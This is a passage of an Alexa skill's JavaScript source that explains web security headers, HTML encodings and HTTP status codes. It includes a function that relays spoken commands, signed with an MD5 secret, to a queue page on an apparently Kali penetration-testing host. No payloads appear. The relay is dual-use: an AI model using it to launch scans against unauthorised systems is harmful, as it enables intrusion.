	"xxss protection" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"xxss" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"xframe options" : "The X-frame-options header is intended to prevent the browser from rendering the page within an iframe to thwart iframe overlay or content replacement patterns common to watering hole attacks",
	"x x s s protection" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"x x s s" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"cross site scripting" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"cross site scripting protection" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings."
	} };
	
const htmlencodings = {   "HTML_EN_US" : {
        "null": { "speech": "ampersand pound 0 semi-colon", "card" : "&#0;"},
        "bell": { "speech": "ampersand pound 7 semi-colon", "card" : "&#7;"},
        "back space": { "speech": "ampersand pound 8 semi-colon", "card" : "&#8;"},
        "tab": { "speech": "ampersand pound 9 semi-colon", "card" : "&#9;"},
        "line feed": { "speech": "ampersand pound 10 semi-colon", "card" : "&#10;"},
	    "enter": { "speech": "ampersand pound 10 semi-colon", "card" : "&#10;"},
        "vertical tab": { "speech": "ampersand pound 11 semi-colon", "card" : "&#11;"},
        "form feed": { "speech": "ampersand pound 12 semi-colon", "card" : "&#12;"},
        "carriage return": { "speech": "ampersand pound 13 semi-colon", "card" : "&#13;"},
        "return": { "speech": "ampersand pound 13 semi-colon", "card" : "&#13;"},
        "data line escape": { "speech": "ampersand pound 16 semi-colon", "card" : "&#16;"},
        "negative ack": { "speech": "ampersand pound 21 semi-colon", "card" : "&#21;"},
        "syn": { "speech": "ampersand pound 22 semi-colon", "card" : "&#22;"},
        "end of block": { "speech": "ampersand pound 23 semi-colon", "card" : "&#23;"},
        "cancel": { "speech": "ampersand pound 24 semi-colon", "card" : "&#24;"},
        "escape": { "speech": "ampersand pound 27 semi-colon", "card" : "&#27;"},
        "space": { "speech": "ampersand pound 32 semi-colon or, ampersand n b s p semi-colon", "card" : "&#32; or &nbsp;"},
        "exclamation": { "speech": "ampersand pound 33 semi-colon or, ampersand i e x c l semi-colon", "card" : "&#33; or &iexcl;"},
        "double quote": { "speech": "ampersand pound 34 semi-colon or, ampersand q u o t semi-colon", "card" : "&#34; or &quot;"},
        "pound": { "speech": "ampersand pound 35 semi-colon", "card" : "&#35;"},
        "hash": { "speech": "ampersand pound 35 semi-colon", "card" : "&#35;"},
        "dollar sign": { "speech": "ampersand pound 36 semi-colon", "card" : "&#36;"},
        "percent": { "speech": "ampersand pound 37 semi-colon", "card" : "&#37;"},
        "ampersand": { "speech": "ampersand pound 38 semi-colon or, ampersand a m p semi-colon", "card" : "&#38; or &amp;"},
        "single quote": { "speech": "ampersand pound 39 semi-colon", "card" : "&#39;"},
        "left paren": { "speech": "ampersand pound 40 semi-colon", "card" : "&#40;"},
        "right paren": { "speech": "ampersand pound 41 semi-colon", "card" : "&#41;"},
        "star": { "speech": "ampersand pound 42 semi-colon", "card" : "&#42;"},
        "plus": { "speech": "ampersand pound 43 semi-colon", "card" : "&#43;"},
        "comma": { "speech": "ampersand pound 44 semi-colon", "card" : "&#44;"},
        "minus": { "speech": "ampersand pound 45 semi-colon", "card" : "&#45;"},
        "period": { "speech": "ampersand pound 46 semi-colon", "card" : "&#46;"},
        "forward slash": { "speech": "ampersand pound 47 semi-colon", "card" : "&#47;"},
        "zero": { "speech": "ampersand pound 48 semi-colon", "card" : "&#48;"},
        "one": { "speech": "ampersand pound 49 semi-colon", "card" : "&#49;"},
        "two": { "speech": "ampersand pound 50 semi-colon", "card" : "&#50;"},
        "three": { "speech": "ampersand pound 51 semi-colon", "card" : "&#51;"},
        "four": { "speech": "ampersand pound 52 semi-colon", "card" : "&#52;"},
        "five": { "speech": "ampersand pound 53 semi-colon", "card" : "&#53;"},
        "six": { "speech": "ampersand pound 54 semi-colon", "card" : "&#54;"},
        "seven": { "speech": "ampersand pound 55 semi-colon", "card" : "&#55;"},
        "eight": { "speech": "ampersand pound 56 semi-colon", "card" : "&#56;"},
        "nine": { "speech": "ampersand pound 57 semi-colon", "card" : "&#57;"},
        "colon": { "speech": "ampersand pound 58 semi-colon", "card" : "&#58;"},
        "semicolon": { "speech": "ampersand pound 59 semi-colon", "card" : "&#59;"},
        "less than": { "speech": "ampersand pound 60 semi-colon", "card" : "&#60;"},
        "equals": { "speech": "ampersand pound 61 semi-colon", "card" : "&#61;"},
        "equal sign": { "speech": "ampersand pound 61 semi-colon", "card" : "&#61;"},
        "equal": { "speech": "ampersand pound 61 semi-colon", "card" : "&#61;"},
        "greater than": { "speech": "ampersand pound 62 semi-colon", "card" : "&#62;"},
        "question mark": { "speech": "ampersand pound 63 semi-colon", "card" : "&#63;"},
        "at sign": { "speech": "ampersand pound 64 semi-colon", "card" : "&#64;"},
        "at": { "speech": "ampersand pound 64 semi-colon", "card" : "&#64;"},
        "capital a": { "speech": "ampersand pound 65 semi-colon", "card" : "&#65;"},
        "capital b": { "speech": "ampersand pound 66 semi-colon", "card" : "&#66;"},
        "capital c": { "speech": "ampersand pound 67 semi-colon", "card" : "&#67;"},
        "capital d": { "speech": "ampersand pound 68 semi-colon", "card" : "&#68;"},
        "capital e": { "speech": "ampersand pound 69 semi-colon", "card" : "&#69;"},
        "capital f": { "speech": "ampersand pound 70 semi-colon", "card" : "&#70;"},
        "capital g": { "speech": "ampersand pound 71 semi-colon", "card" : "&#71;"},
        "capital h": { "speech": "ampersand pound 72 semi-colon", "card" : "&#72;"},
        "capital i": { "speech": "ampersand pound 73 semi-colon", "card" : "&#73;"},
        "capital j": { "speech": "ampersand pound 74 semi-colon", "card" : "&#74;"},
        "capital k": { "speech": "ampersand pound 75 semi-colon", "card" : "&#75;"},
        "capital l": { "speech": "ampersand pound 76 semi-colon", "card" : "&#76;"},
        "capital m": { "speech": "ampersand pound 77 semi-colon", "card" : "&#77;"},
        "capital n": { "speech": "ampersand pound 78 semi-colon", "card" : "&#78;"},
        "capital o": { "speech": "ampersand pound 79 semi-colon", "card" : "&#79;"},
        "capital p": { "speech": "ampersand pound 80 semi-colon", "card" : "&#80;"},
        "capital q": { "speech": "ampersand pound 81 semi-colon", "card" : "&#81;"},
        "capital r": { "speech": "ampersand pound 82 semi-colon", "card" : "&#82;"},
        "capital s": { "speech": "ampersand pound 83 semi-colon", "card" : "&#83;"},
        "capital t": { "speech": "ampersand pound 84 semi-colon", "card" : "&#84;"},
        "capital u": { "speech": "ampersand pound 85 semi-colon", "card" : "&#85;"},
        "capital v": { "speech": "ampersand pound 86 semi-colon", "card" : "&#86;"},
        "capital w": { "speech": "ampersand pound 87 semi-colon", "card" : "&#87;"},
        "capital x": { "speech": "ampersand pound 88 semi-colon", "card" : "&#88;"},
        "capital y": { "speech": "ampersand pound 89 semi-colon", "card" : "&#89;"},
        "capital z": { "speech": "ampersand pound 90 semi-colon", "card" : "&#90;"},
	    "upper case a": { "speech": "ampersand pound 65 semi-colon", "card" : "&#65;"},
        "upper case b": { "speech": "ampersand pound 66 semi-colon", "card" : "&#66;"},
        "upper case c": { "speech": "ampersand pound 67 semi-colon", "card" : "&#67;"},
        "upper case d": { "speech": "ampersand pound 68 semi-colon", "card" : "&#68;"},
        "upper case e": { "speech": "ampersand pound 69 semi-colon", "card" : "&#69;"},
        "upper case f": { "speech": "ampersand pound 70 semi-colon", "card" : "&#70;"},
        "upper case g": { "speech": "ampersand pound 71 semi-colon", "card" : "&#71;"},
        "upper case h": { "speech": "ampersand pound 72 semi-colon", "card" : "&#72;"},
        "upper case i": { "speech": "ampersand pound 73 semi-colon", "card" : "&#73;"},
        "upper case j": { "speech": "ampersand pound 74 semi-colon", "card" : "&#74;"},
        "upper case k": { "speech": "ampersand pound 75 semi-colon", "card" : "&#75;"},
        "upper case l": { "speech": "ampersand pound 76 semi-colon", "card" : "&#76;"},
        "upper case m": { "speech": "ampersand pound 77 semi-colon", "card" : "&#77;"},
        "upper case n": { "speech": "ampersand pound 78 semi-colon", "card" : "&#78;"},
        "upper case o": { "speech": "ampersand pound 79 semi-colon", "card" : "&#79;"},
        "upper case p": { "speech": "ampersand pound 80 semi-colon", "card" : "&#80;"},
        "upper case q": { "speech": "ampersand pound 81 semi-colon", "card" : "&#81;"},
        "upper case r": { "speech": "ampersand pound 82 semi-colon", "card" : "&#82;"},
        "upper case s": { "speech": "ampersand pound 83 semi-colon", "card" : "&#83;"},
        "upper case t": { "speech": "ampersand pound 84 semi-colon", "card" : "&#84;"},
        "upper case u": { "speech": "ampersand pound 85 semi-colon", "card" : "&#85;"},
        "upper case v": { "speech": "ampersand pound 86 semi-colon", "card" : "&#86;"},
        "upper case w": { "speech": "ampersand pound 87 semi-colon", "card" : "&#87;"},
        "upper case x": { "speech": "ampersand pound 88 semi-colon", "card" : "&#88;"},
        "upper case y": { "speech": "ampersand pound 89 semi-colon", "card" : "&#89;"},
        "upper case z": { "speech": "ampersand pound 90 semi-colon", "card" : "&#90;"},
        "left square bracket": { "speech": "ampersand pound 91 semi-colon", "card" : "&#91;"},
        "slash": { "speech": "ampersand pound 92 semi-colon", "card" : "&#92;"},
	    "back slash": { "speech": "ampersand pound 92 semi-colon", "card" : "&#92;"},
        "right square bracket": { "speech": "ampersand pound 93 semi-colon", "card" : "&#93;"},
        "carret": { "speech": "ampersand pound 94 semi-colon", "card" : "&#94;"},
        "underscore": { "speech": "ampersand pound 95 semi-colon", "card" : "&#95;"},
        "grave": { "speech": "ampersand pound 96 semi-colon", "card" : "&#96;"},
        "a": { "speech": "ampersand pound 97 semi-colon", "card" : "&#97;"},
        "b": { "speech": "ampersand pound 98 semi-colon", "card" : "&#98;"},
        "c": { "speech": "ampersand pound 99 semi-colon", "card" : "&#99;"},
        "d": { "speech": "ampersand pound 100 semi-colon", "card" : "&#100;"},
        "e": { "speech": "ampersand pound 101 semi-colon", "card" : "&#101;"},
        "f": { "speech": "ampersand pound 102 semi-colon", "card" : "&#102;"},
        "g": { "speech": "ampersand pound 103 semi-colon", "card" : "&#103;"},
        "h": { "speech": "ampersand pound 104 semi-colon", "card" : "&#104;"},
        "i": { "speech": "ampersand pound 105 semi-colon", "card" : "&#105;"},
        "j": { "speech": "ampersand pound 106 semi-colon", "card" : "&#106;"},
        "k": { "speech": "ampersand pound 107 semi-colon", "card" : "&#107;"},
        "l": { "speech": "ampersand pound 108 semi-colon", "card" : "&#108;"},
        "m": { "speech": "ampersand pound 109 semi-colon", "card" : "&#109;"},
        "n": { "speech": "ampersand pound 110 semi-colon", "card" : "&#110;"},
        "o": { "speech": "ampersand pound 111 semi-colon", "card" : "&#111;"},
        "p": { "speech": "ampersand pound 112 semi-colon", "card" : "&#112;"},
        "q": { "speech": "ampersand pound 113 semi-colon", "card" : "&#113;"},
        "r": { "speech": "ampersand pound 114 semi-colon", "card" : "&#114;"},
        "s": { "speech": "ampersand pound 115 semi-colon", "card" : "&#115;"},
        "t": { "speech": "ampersand pound 116 semi-colon", "card" : "&#116;"},
        "u": { "speech": "ampersand pound 117 semi-colon", "card" : "&#117;"},
        "v": { "speech": "ampersand pound 118 semi-colon", "card" : "&#118;"},
        "w": { "speech": "ampersand pound 119 semi-colon", "card" : "&#119;"},
        "x": { "speech": "ampersand pound 120 semi-colon", "card" : "&#120;"},
        "y": { "speech": "ampersand pound 121 semi-colon", "card" : "&#121;"},
        "z": { "speech": "ampersand pound 122 semi-colon", "card" : "&#122;"},
        "left curly brace": { "speech": "ampersand pound 123 semi-colon", "card" : "&#123;"},
        "pipe": { "speech": "ampersand pound 124 semi-colon", "card" : "&#124;"},
        "right curly brace": { "speech": "ampersand pound 125 semi-colon", "card" : "&#125;"},
        "squiggle": { "speech": "ampersand pound 126 semi-colon", "card" : "&#126;"},
        "empty": { "speech": "ampersand pound 127 semi-colon", "card" : "&#127;"},
	    "delete": { "speech": "ampersand pound 127 semi-colon", "card" : "&#127;"},
        "euro": { "speech": "ampersand pound 128 semi-colon, or ampersand e u r o semi-colon", "card" : "&#128; or &euro;"},
        "blank": { "speech": "ampersand pound 129 semi-colon", "card" : "&#129;"},
        "quote comma": { "speech": "ampersand pound 130 semi-colon, or ampersand s b q u o semi-colon", "card" : "&#130; or &sbquo;"},
        "fnot": { "speech": "ampersand pound 131 semi-colon, or ampersand f n o t semi-colon", "card" : "&#131; or &fnot;"},
        "lowerquotes": { "speech": "ampersand pound 132 semi-colon, ampersand b d q u o semi-colon", "card" : "&#132; or &bdquo;"},
        "ellipsis": { "speech": "ampersand pound 133 semi-colon, ampersand h e l l i p semi-colon", "card" : "&#133; or &hellip;"},
        "dagger": { "speech": "ampersand pound 134 semi-colon, ampersand d a g g e r semi-colon", "card" : "&#134; or &dagger;"},
        "left side quote": { "speech": "ampersand pound 145 semi-colon, ampersand l s q u o semi-colon", "card" : "&#145; or &lsquo;"},
        "right side quote": { "speech": "ampersand pound 146 semi-colon, ampersand r s q u o semi-colon", "card" : "&#146; or &rsquo;"},
        "left double quote": { "speech": "ampersand pound 147 semi-colon, ampersand l d q u o semi-colon", "card" : "&#147; or &ldquo;"},
        "right double quote": { "speech": "ampersand pound 148 semi-colon, ampersand r d q u o semi-colon", "card" : "&#148; or &rdquo;"},
        "tilde": { "speech": "ampersand pound 152 semi-colon, ampersand t i l d e semi-colon", "card" : "&#152; or &tilde;"}
}};   
  
const charencodings = {   "CHAR_EN_US" : {
        "null": { "speech": "", "card" : "0"},
        "bell": { "speech": "", "card" : "7"},
        "back space": { "speech": "", "card" : "8"},
        "backspace": { "speech": "", "card" : "8"},
        "tab": { "speech": "", "card" : "9"},
        "line feed": { "speech": "", "card" : "10"},
	    "enter": { "speech": "", "card" : "10"},
        "vertical tab": { "speech": "", "card" : "11"},
        "form feed": { "speech": "", "card" : "12"},
        "carriage return": { "speech": "", "card" : "13"},
        "return": { "speech": "", "card" : "13"},
        "data line escape": { "speech": "", "card" : "16"},
        "negative ack": { "speech": "", "card" : "21"},
        "syn": { "speech": "", "card" : "22"},
        "end of block": { "speech": "", "card" : "23"},
        "cancel": { "speech": "", "card" : "24"},
        "escape": { "speech": "", "card" : "27"},
        "space": { "speech": "", "card" : "32"},
        "exclamation": { "speech": "", "card" : "33"},
        "exclamation point": { "speech": "", "card" : "33"},
        "double quote": { "speech": "", "card" : "34"},
        "pound": { "speech": "", "card" : "35"},
        "dollar sign": { "speech": "", "card" : "36"},
        "percent": { "speech": "", "card" : "37"},
        "percent sign": { "speech": "", "card" : "37"},
        "ampersand": { "speech": "", "card" : "38"},
        "single quote": { "speech": "", "card" : "39"},
        "left paren": { "speech": "", "card" : "40"},
        "right paren": { "speech": "", "card" : "41"},
        "star": { "speech": "", "card" : "42"},
        "plus": { "speech": "", "card" : "43"},
        "comma": { "speech": "", "card" : "44"},
        "minus": { "speech": "", "card" : "45"},
        "period": { "speech": "", "card" : "46"},
        "forward slash": { "speech": "", "card" : "47"},
        "zero": { "speech": "", "card" : "48"},
        "one": { "speech": "", "card" : "49"},
        "two": { "speech": "", "card" : "50"},
        "three": { "speech": "", "card" : "51"},
        "four": { "speech": "", "card" : "52"},
        "five": { "speech": "", "card" : "53"},
        "six": { "speech": "", "card" : "54"},
        "seven": { "speech": "", "card" : "55"},
        "eight": { "speech": "", "card" : "56"},
        "nine": { "speech": "", "card" : "57"},
        "colon": { "speech": "", "card" : "58"},
        "semicolon": { "speech": "", "card" : "59"},
        "less than": { "speech": "", "card" : "60"},
        "equals": { "speech": "", "card" : "61"},
        "equal": { "speech": "", "card" : "61"},
        "equal sign": { "speech": "", "card" : "61"},
        "greater than": { "speech": "", "card" : "62"},
        "question mark": { "speech": "", "card" : "63"},
        "at sign": { "speech": "", "card" : "64"},
        "at": { "speech": "", "card" : "64"},
        "capital a": { "speech": "", "card" : "65"},
        "capital b": { "speech": "", "card" : "66"},
        "capital c": { "speech": "", "card" : "67"},
        "capital d": { "speech": "", "card" : "68"},
        "capital e": { "speech": "", "card" : "69"},
        "capital f": { "speech": "", "card" : "70"},
        "capital g": { "speech": "", "card" : "71"},
        "capital h": { "speech": "", "card" : "72"},
        "capital i": { "speech": "", "card" : "73"},
        "capital j": { "speech": "", "card" : "74"},
        "capital k": { "speech": "", "card" : "75"},
        "capital l": { "speech": "", "card" : "76"},
        "capital m": { "speech": "", "card" : "77"},
        "capital n": { "speech": "", "card" : "78"},
        "capital o": { "speech": "", "card" : "79"},
        "capital p": { "speech": "", "card" : "80"},
        "capital q": { "speech": "", "card" : "81"},
        "capital r": { "speech": "", "card" : "82"},
        "capital s": { "speech": "", "card" : "83"},
        "capital t": { "speech": "", "card" : "84"},
        "capital u": { "speech": "", "card" : "85"},
        "capital v": { "speech": "", "card" : "86"},
        "capital w": { "speech": "", "card" : "87"},
        "capital x": { "speech": "", "card" : "88"},
        "capital y": { "speech": "", "card" : "89"},
        "capital z": { "speech": "", "card" : "90"},
	    "upper case a": { "speech": "", "card" : "65"},
        "upper case b": { "speech": "", "card" : "66"},
        "upper case c": { "speech": "", "card" : "67"},
        "upper case d": { "speech": "", "card" : "68"},
        "upper case e": { "speech": "", "card" : "69"},
        "upper case f": { "speech": "", "card" : "70"},
        "upper case g": { "speech": "", "card" : "71"},
        "upper case h": { "speech": "", "card" : "72"},
        "upper case i": { "speech": "", "card" : "73"},
        "upper case j": { "speech": "", "card" : "74"},
        "upper case k": { "speech": "", "card" : "75"},
        "upper case l": { "speech": "", "card" : "76"},
        "upper case m": { "speech": "", "card" : "77"},
        "upper case n": { "speech": "", "card" : "78"},
        "upper case o": { "speech": "", "card" : "79"},
        "upper case p": { "speech": "", "card" : "80"},
        "upper case q": { "speech": "", "card" : "81"},
        "upper case r": { "speech": "", "card" : "82"},
        "upper case s": { "speech": "", "card" : "83"},
        "upper case t": { "speech": "", "card" : "84"},
        "upper case u": { "speech": "", "card" : "85"},
        "upper case v": { "speech": "", "card" : "86"},
        "upper case w": { "speech": "", "card" : "87"},
        "upper case x": { "speech": "", "card" : "88"},
        "upper case y": { "speech": "", "card" : "89"},
        "upper case z": { "speech": "", "card" : "90"},
        "left square bracket": { "speech": "", "card" : "91"},
        "slash": { "speech": "", "card" : "92"},
        "back slash": { "speech": "", "card" : "92"},
        "backslash": { "speech": "", "card" : "92"},
        "right square bracket": { "speech": "", "card" : "93"},
        "carret": { "speech": "", "card" : "94"},
        "underscore": { "speech": "", "card" : "95"},
        "grave": { "speech": "", "card" : "96"},
        "a": { "speech": "", "card" : "97"},
        "b": { "speech": "", "card" : "98"},
        "c": { "speech": "", "card" : "99"},
        "d": { "speech": "", "card" : "100"},
        "e": { "speech": "", "card" : "101"},
        "f": { "speech": "", "card" : "102"},
        "g": { "speech": "", "card" : "103"},
        "h": { "speech": "", "card" : "104"},
        "i": { "speech": "", "card" : "105"},
        "j": { "speech": "", "card" : "106"},
        "k": { "speech": "", "card" : "107"},
        "l": { "speech": "", "card" : "108"},
        "m": { "speech": "", "card" : "109"},
        "n": { "speech": "", "card" : "110"},
        "o": { "speech": "", "card" : "111"},
        "p": { "speech": "", "card" : "112"},
        "q": { "speech": "", "card" : "113"},
        "r": { "speech": "", "card" : "114"},
        "s": { "speech": "", "card" : "115"},
        "t": { "speech": "", "card" : "116"},
        "u": { "speech": "", "card" : "117"},
        "v": { "speech": "", "card" : "118"},
        "w": { "speech": "", "card" : "119"},
        "x": { "speech": "", "card" : "120"},
        "y": { "speech": "", "card" : "121"},
        "z": { "speech": "", "card" : "122"},
        "left curly brace": { "speech": "", "card" : "123"},
        "pipe": { "speech": "", "card" : "124"},
        "right curly brace": { "speech": "", "card" : "125"},
        "squiggle": { "speech": "", "card" : "126"},
        "empty": { "speech": "", "card" : "127"},
	    "delete": { "speech": "", "card" : "127"},
        "euro": { "speech": "", "card" : "128"},
        "blank": { "speech": "", "card" : "129"},
        "quote comma": { "speech": "", "card" : "130"},
        "fnot": { "speech": "", "card" : "131"},
        "lowerquotes": { "speech": "", "card" : "132"},
        "ellipsis": { "speech": "", "card" : "133"},
        "dagger": { "speech": "", "card" : "134"},
        "left side quote": { "speech": "", "card" : "145"},
        "right side quote": { "speech": "", "card" : "146"},
        "left double quote": { "speech": "", "card" : "147"},
        "right double quote": { "speech": "", "card" : "148"},
        "tilde": { "speech": "", "card" : "152"}
}};
	
const responsecodes = {   "RESPONSECODES_EN_US" : {
 	"100": "100 or Continue, tells the client that it should finish sending the next portion of the request.",
	"101": "101 Switching Protocols means that the server had a positive response to the request and is initiating a new protocol other than HTTP with the Upgrade header.",
	"200": "200 OK. The OK response indicates success. GET returns the resource in the response, POST returns an entity describig the results of the post.",
	"201": "201 Created indicates that the request was received and processed and resulted in the creation of a resource.",
	"202": "202 or Accepted indicates that a request has been accepted for asynchronous processing.",
	"203": "203 Non-Authoritative Information is returned when a response contains a copy of data which is not from the origin server.",
	"204": "204 or No Content, is a response that lets the user agent know the action was successful but no response body will be returned for the action, but headers may contain information about the results of the request.",
	"205": "205 Reset Content tells the user agent to reset the document view. This code was intended to assist with user input actions so that input forms could be reset.",
	"206": "206 or Partial Content is a response to a request which specified a range.",
	"300": "300 or Multiple Choices, means that a resource may be found at several different locations. The response should contain a list of the locations.",
	"301": "301 or Moved Permanently, means that the resource has been moved to a different URI. The new URI should be returned in the Location response header.",
	"302": "302 or Found, indicates that the requested resource is located at a different URI. The URI should be specified in the Location response header. ",
	"303": "303 or See Other. The request may be able to be satisfied by a resource at a different URI.",
	"304": "304 is Not Modified. Requests that specify headers which retrieve data if the data has changed may receive this response.",
	"305": "305 is Use Proxy. The requested URI must be requested via the proxy specified in the Location header.",
	"306": "306 is Unused. Response code 306 is not supported in the current HTTP specification.",
	"307": "307 Temporary Redirect. The requested URI is temporarily located elsewhere.",
	"400": "400 indicates a Bad Request.",
	"401": "401 is Unauthorized. The response should include a WWW authenticate header.",
	"402": "402 is Payment Required. This code is reserved for pay wall functionality.",
	"403": "403 is Forbidden. The reason for the forbidden request should be specified in the response.",
	"404": "404 is Not Found. The server was not able to find the URI or the request is being disallowed for unspecified reasons.",
	"405": "405 is Method Not Allowed. The response should include an Allow header that specifies accepted methods.",
	"406": "406 is Not Acceptable. Not Acceptable means that the request headers specify that the content type the server is able to respond with is explicitly not supported.",
	"407": "407 is Proxy Authentication Required.",
	"408": "408 is Request Timeout.",
	"409": "409 is Conflict. Responding to the request would cause a state problem, or data contention issue. A list of differences in the resource data may be returned along with this response code.",
	"410": "410 is Gone. The Gone response indicates that the requested resource is not available and has no forwarding information.",
	"411": "411 is Length Required.",
	"412": "412 is Precondition Failed.",
	"413": "413 is Request Entity Too Large.",
	"414": "414 is Request URI Too Long",
	"415": "415 is Unsupported Media Type.",
	"416": "416 is Request Range Not Satisfiable. This is received when a Range header provided a range that does not match what the server can provide.",
	"417": "417 is Expectation Failed. Or, a request header field could not be honored by the server.",
	"500": "500 is Internal Server Error",
	"501": "501 is Not Implemented.",
	"502": "502 is Bad Gateway",
	"503": "503 is Service Unavailable.",
	"504": "504 is Gateway Timeout.",
	"505": "505 is HTTP Version Not Supported."
}};	

// Web request functions //////////////////////////////////
//////////////////// Send AlexaToKaliQueuePage //////////////////////
    function sendAlexa2KaliRequest(action,actionvalue)
    {
        console.log("About to send request");
        var ipdash = action + "," + actionvalue; 
        var signature = crypto.createHash('md5').update(ipdash + process.env.SecretKey).digest("hex");
        var hoststr = "https://" + process.env.SecretURL +"/" + process.env.AlexaToKaliQueuePage + "?cmd=" + action + "," + actionvalue + "&sig=" + signature;
        console.log ("sendAlexa2KaliRequest host=" + hoststr);
        var body = "";
     https.get(hoststr, (res) => {
        console.log('sendAlexa2KaliRequest statusCode:', res.statusCode);
        console.log('sendAlexa2KaliRequest headers:', res.headers);
        res.on('data', (d) => {
        	body += d;
            console.log(d);
            });
            // should fire when request is done
             res.on('end', function () {
               gotoAlexa2KaliRequest(action,res.statusCode); });
            // return data response
            return body;
            }).on('error', (e) => {
                console.log(e);
        });
    }
            
    function gotoAlexa2KaliRequest(action,status)
    { 
    	console.log("DoneScanRequest status=" + status);
        if (status ===200) {
       	    console.log("Alexa2KaliRequest request: action=" + action + " status code=" + status);
        	return "success";
        } 
        else {   // 404 or other error response code
            console.log("Alexa2KaliRequest request: action=" + action + " status code=" + status);
        }
    }
///////////////////////////////////////////////////////////
//////////////////// Read process.env.AlexaReadQueuePage //////////////////////

// Web request functions //////////////////////////////////
///////////////////////////////////////////////////////////    
    
    function getRandomInt(low, high) 
    { 
             return Math.floor(Math.random() * (high - low + 1)) + low;
    }
         
    
const handlers = {
 
    'Unhandled': function () {
        console.log("Unhandled Exception for APP: " + APP_ID);
        //console.log("Intent" + this.event.request.intent);
        //console.log("Slots:" + this.event.request.intent.slots);
        var speechOutput = "I ran into an unhandeled error"; // this.t('UNHANDLED_SPEECH');
        this.emit(':tell', speechOutput);
    },
    
    'NewSession': function () {
        console.log("-NewSession");
       // console.log("APP_ID="+ APP_ID);
       console.log("THIS.EVENT = " + JSON.stringify(this.event));
       // console.log("Slots: " + this.event.request.intent.slots);
		var randomN = getRandomInt(0,6);
		var welcomeMessage="Random Number is ";
		if (randomN === 0) {welcomeMessage = this.t('WELCOME_MESSAGE0')} 
			else if (randomN === 1) {welcomeMessage = this.t('WELCOME_MESSAGE1')} 
			else if (randomN === 2) {welcomeMessage=this.t('WELCOME_MESSAGE2')}
			else if (randomN === 3) {welcomeMessage=this.t('WELCOME_MESSAGE3')}
			else if (randomN === 4) {welcomeMessage=this.t('WELCOME_MESSAGE4')}
			else if (randomN === 5) {welcomeMessage=this.t('WELCOME_MESSAGE5')}
			else {welcomeMessage=this.t('WELCOME_MESSAGE6')}
        //console.log(this.event.request.hasOwnProperty('intent'));
        if (this.event.request.hasOwnProperty('intent') === false)
        {
        this.attributes.speechOutput = welcomeMessage;  
        //this.t('WELCOME_MESSAGE', this.t('SKILL_NAME'));
        // If the user either does not reply to the welcome message or says something that is not
        // understood, they will be prompted again with this text.
        }
        
        this.attributes.repromptSpeech = this.t('WELCOME_REPROMPT');
        this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
        
    },      

	'MissingIPIntent': function(){
		// fill in whichever is undefined with the value of slot 1 that we got from the user
            if (this.event.request.intent.slots.IPItemOne.value) {
            	if(! this.attributes['IPItemOne'])  this.attributes['IPItemOne'] = this.event.request.intent.slots.IPItemOne.value;
            	if(! this.attributes['IPItemOne'])  this.attributes['IPItemOne'] = this.event.request.intent.slots.IPItemOne.value;
            	if(! this.attributes['IPItemOne'])  this.attributes['IPItemOne'] = this.event.request.intent.slots.IPItemOne.value;
            	if(! this.attributes['IPItemOne'])  this.attributes['IPItemOne'] = this.event.request.intent.slots.IPItemOne.value;
            }
	},
	
	'KnownPortsIntent': function () {
        const itemSlot = this.event.request.intent.slots.NUMItem;
        console.log("THIS.EVENT = " + JSON.stringify(this.event));
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
        }      
        
        const cardTitle = this.t('PORTS_DISPLAY_CARD_TITLE', this.t('SKILL_NAME'), itemName);
        const myPorts = this.t('PORTS');
        const ports = myPorts[itemName];
               
        if (ports) {
            this.attributes.speechOutput = ports;
            this.attributes.repromptSpeech = this.t('WEBHEADERS_REPEAT_MESSAGE');
            this.emit(':askWithCard', ports, this.attributes.repromptSpeech, cardTitle, ports);
        } else {
            let speechOutput = this.t('PORTS_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('PORTS_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('PORTS_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('PORTS_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('KnownPortsIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 
	
    'WebHeadersIntent': function () {
        const itemSlot = this.event.request.intent.slots.WHItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('WEBHEADERS_DISPLAY_CARD_TITLE', itemName);
        const myWebHeaders = this.t('WEBHEADERS');
        const webheaders = myWebHeaders[itemName];
               
        if (webheaders) {
            this.attributes.speechOutput = webheaders;
            this.attributes.repromptSpeech = this.t('WEBHEADERS_REPEAT_MESSAGE');
            this.emit(':askWithCard', webheaders, this.attributes.repromptSpeech, cardTitle, webheaders);
        } else {
            let speechOutput = this.t('WEBHEADERS_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('WEBHEADERS_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('WEBHEADERS_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('WEBHEADERS_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
